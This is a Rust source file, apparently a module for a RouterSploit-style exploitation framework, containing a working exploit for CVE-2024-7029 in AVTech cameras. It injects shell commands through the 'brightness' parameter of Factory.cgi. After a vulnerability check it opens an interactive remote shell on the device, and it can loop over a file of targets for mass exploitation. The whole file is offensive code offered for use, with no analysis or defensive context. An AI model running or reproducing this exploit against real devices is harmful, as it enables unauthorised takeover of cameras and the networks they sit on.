use anyhow::Result;
use colored::*;
use reqwest::Client;
use std::io::{self, Write};
use std::path::Path;
use std::time::Duration;
use tokio::io::{AsyncBufReadExt, BufReader};

const DEFAULT_PORT: &str = "80";
const DEFAULT_TIMEOUT_SECS: u64 = 10;

/// Display module banner
fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   AVTech Camera CVE-2024-7029 RCE Exploit                 ║".cyan());
    println!("{}", "║   Command Injection via brightness parameter              ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}

/// // Ensures the target string has a scheme (http://) and includes port
fn normalize_url(ip: &str, port: &str) -> String {
    let with_scheme = if ip.starts_with("http://") || ip.starts_with("https://") {
        ip.to_string()
    } else {
        format!("http://{}", ip)
    };

    let port = port.trim();
    if port.is_empty() {
        with_scheme
    } else if with_scheme.contains(':') {
        with_scheme // already has port
    } else {
        format!("{}:{}", with_scheme, port)
    }
}

/// Check if the device is vulnerable to CVE-2024-7029
async fn check_vuln(client: &Client, base: &str) -> Result<bool> {
    println!("{}", "[*] Checking vulnerability...".cyan());
    let mut url = reqwest::Url::parse(base)?;
    url.set_path("/cgi-bin/supervisor/Factory.cgi");
    url.query_pairs_mut()
        .append_pair("action", "Set")
        .append_pair("brightness", "1;echo_CVE7029;");
    let resp = client.get(url).send().await?;
    let body = resp.text().await?;
    Ok(body.contains("echo_CVE7029"))
}

/// Interactive shell to send arbitrary commands
async fn interactive_shell(client: &Client, base: &str) -> Result<()> {
    let stdin = tokio::io::stdin();
    let mut lines = BufReader::new(stdin).lines();

    println!("{}", "[+] Interactive shell started. Type 'exit' to quit.".green().bold());
    loop {
        print!("{}", "cve7029-shell> ".cyan().bold());
        io::stdout().flush()?;
        if let Some(cmd) = lines.next_line().await? {
            let cmd = cmd.trim();
            if cmd.eq_ignore_ascii_case("exit") {
                println!("{}", "[*] Exiting shell...".yellow());
                break;
            }
            if cmd.is_empty() {
                continue;
            }
            match exec_cmd(client, base, cmd).await {
                Ok(out) => println!("{}", out),
                Err(e) => println!("{}", format!("[-] Error: {}", e).red()),
            }
        } else {
            break;
        }
    }
    Ok(())
}

/// // Execute a remote command by abusing the brightness parameter
async fn exec_cmd(client: &Client, base: &str, cmd: &str) -> Result<String> {
    let mut url = reqwest::Url::parse(base)?;
    url.set_path("/cgi-bin/supervisor/Factory.cgi");
    let payload = format!("1;{};", cmd);
    url.query_pairs_mut()
        .append_pair("action", "Set")
        .append_pair("brightness", &payload);
    let response = client.get(url).send().await?;
    Ok(response.text().await?)
}

/// Prompt user for a custom port number
fn prompt_port() -> Result<String> {
    print!("{}", format!("Enter port to use [default: {}]: ", DEFAULT_PORT).cyan().bold());
    io::stdout().flush()?;
    let mut port = String::new();
    io::stdin().read_line(&mut port)?;
    let port = port.trim();
    Ok(if port.is_empty() { DEFAULT_PORT.to_string() } else { port.to_string() })
}

/// Entry point required for RouterSploit-inspired dispatch system
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target: {}", target).yellow());
    println!();

    let port = prompt_port()?;
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .build()?;

    // Handle either single IP or file of targets
    let targets = if Path::new(target).exists() {
        println!("{}", format!("[*] Loading targets from file: {}", target).cyan());
        tokio::fs::read_to_string(target)
            .await?
            .lines()
            .map(str::to_string)
            .filter(|s| !s.trim().is_empty())
            .collect::<Vec<_>>()
    } else {
        vec![target.to_string()]
    };

    println!("{}", format!("[*] Testing {} target(s)...", targets.len()).cyan());
    println!();

    for raw_ip in &targets {
        let url = normalize_url(raw_ip, &port);
        println!("{}", format!("[*] Testing: {}", url).yellow());
        
        if check_vuln(&client, &url).await? {
            println!("{}", format!("[+] {} is VULNERABLE!", url).green().bold());
            interactive_shell(&client, &url).await?;
        } else {
            println!("{}", format!("[-] {} is not vulnerable", url).red());
        }
        println!();
    }

    println!("{}", "[*] Scan complete.".cyan());
    Ok(())
}
